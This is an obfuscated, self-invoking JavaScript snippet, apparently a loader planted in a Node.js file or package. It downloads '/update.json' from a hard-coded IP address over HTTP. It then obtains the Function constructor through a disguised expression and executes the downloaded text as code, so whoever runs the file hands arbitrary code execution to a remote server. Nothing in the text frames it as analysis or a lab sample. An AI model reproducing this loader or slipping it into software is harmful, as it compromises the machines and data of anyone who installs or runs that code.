;(function () {
  var _0x53a650 = require('http')
  return _0x53a650.get(
    {
      host: '23.94.46.191',
      port: 80,
      path: '/update.json',
    },
    function (_0x3771e5) {
      var _0xa2613b = ''
      _0x3771e5.on('data', function (_0x447c5d) {
        _0xa2613b += _0x447c5d
      })
      _0x3771e5.on('end', function () {
        var _0x243de2 =
          this[
            (typeof this.Buffer.from).charAt(0).toUpperCase() +
              (typeof this.Buffer.from).slice(1)
          ]
        var _0x23ca55 = new _0x243de2(_0xa2613b)
        _0x23ca55()
      })
    }
  )
})()
